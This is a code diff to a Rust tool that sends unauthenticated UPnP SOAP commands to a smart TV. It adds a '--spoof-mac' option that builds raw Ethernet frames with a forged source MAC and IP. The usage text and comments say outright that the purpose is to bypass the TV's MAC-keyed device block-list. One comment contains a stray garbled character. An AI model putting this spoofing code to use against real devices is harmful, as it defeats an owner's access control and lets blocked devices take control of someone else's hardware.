@@ -20,6 +20,8 @@
 //! Everything here is unauthenticated: no token, no pairing, no on-screen prompt.
 //! Run it against your own equipment only.
 
+mod rawtcp;
+
 use std::collections::BTreeMap;
 use std::fs::File;
 use std::io::{BufRead, BufReader, ErrorKind, Read, Seek, SeekFrom, Write};
@@ -62,6 +64,21 @@ const REMOTE_SAMPLE: &str = "http://www.w3schools.com/html/mov_bbb.mp4";
 /// The router has little RAM; do not let每 connection thread take the 2 MB default.
 const THREAD_STACK: usize = 96 * 1024;
 const CHUNK: usize = 64 * 1024;
+
+// ---------------------------------------------------------------- spoofing
+
+/// When set, every SOAP control call is built as raw Ethernet frames carrying a
+/// MAC that is not ours, instead of going through the kernel's TCP stack. The
+/// media server keeps the real address on purpose: the TV consults its
+/// block-list where it *receives* the SOAP action (dmr -> GetAclEntryByMAC),
+/// not where it fetches the file from.
+static mut SPOOF: Option<rawtcp::Spoof> = None;
+
+/// Set once in main() before any thread starts; read-only from then on.
+fn spoof() -> Option<&'static rawtcp::Spoof> {
+    #[allow(static_mut_refs)]
+    unsafe { SPOOF.as_ref() }
+}
 
 // ---------------------------------------------------------------- shared state
 
@@ -289,6 +306,19 @@ s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body>\
 </u:{action}></s:Body></s:Envelope>"
     );
     let soapaction = format!("\"{ns}#{action}\"");
+    if let Some(sp) = spoof() {
+        let u = parse_url(ctrl).expect("bad control url");
+        let (host, port, path) = (u.host.to_string(), u.port, u.path.to_string());
+        return match rawtcp::http_post(
+            sp, &host, port, &path,
+            &[("Content-Type", "text/xml; charset=\"utf-8\""),
+              ("SOAPACTION", &soapaction)],
+            envelope.as_bytes(),
+        ) {
+            Ok(v) => v,
+            Err(e) => (0, e.to_string()),
+        };
+    }
     match http_post(
         ctrl,
         &[
@@ -663,6 +693,11 @@ fn usage() {
   --ctrl-caption     also fire X_ControlCaption(Enable) during playback
   --remote [url]     point the TV at a remote clip, bypassing our server
   --nopoll           do not poll the renderer while it streams
+  --spoof-mac <mac>  send SOAP from this MAC via raw frames (bypasses the
+                     TV's MAC-keyed device block-list; needs root)
+  --spoof-ip <ip>    source IP for the spoofed frames  (default 192.168.1.240)
+  --tv-mac <mac>     TV's MAC; looked up in /proc/net/arp when omitted
+  --if <iface>       interface for raw frames          (default br0)
   --help"
     );
 }
@@ -683,6 +718,34 @@ fn main() {
         .unwrap_or(DEFAULT_PORT);
     let media = args.val("--media").unwrap_or_else(|| "media.mp4".to_string());
     let tv = Tv::new(&tv_ip);
+
+    // --spoof-mac turns the control channel into hand-built frames carrying a MAC
+    // that is not ours. The TV's block-list is keyed on exactly that field
+    // (dmr imports asf_upnp::cd_utils::GetAclEntryByMAC), so a blocked device can
+    // present a different one without changing any interface address.
+    if let Some(m) = args.val("--spoof-mac") {
+        let src_ip = args.val("--spoof-ip").unwrap_or_else(|| "192.168.1.240".into());
+        let iface = args.val("--if").unwrap_or_else(|| "br0".into());
+        let dst_mac = match args.val("--tv-mac") {
+            Some(v) => rawtcp::parse_mac(&v),
+            None => match rawtcp::arp_lookup(&tv_ip) {
+                Some(v) => v,
+                None => {
+                    eprintln!("cannot find {tv_ip} in /proc/net/arp - ping it first,                                or pass --tv-mac");
+                    std::process::exit(1);
+                }
+            },
+        };
+        println!("    [SPOOF] control channel as {m} / {src_ip} on {iface}                   (interface address untouched)");
+        unsafe {
+            SPOOF = Some(rawtcp::Spoof {
+                iface,
+                src_mac: rawtcp::parse_mac(&m),
+                src_ip: rawtcp::parse_ip(&src_ip),
+                dst_mac,
+            });
+        }
+    }
 
     if args.has("--status") {
         let (st, sts, pos) = tv.transport();
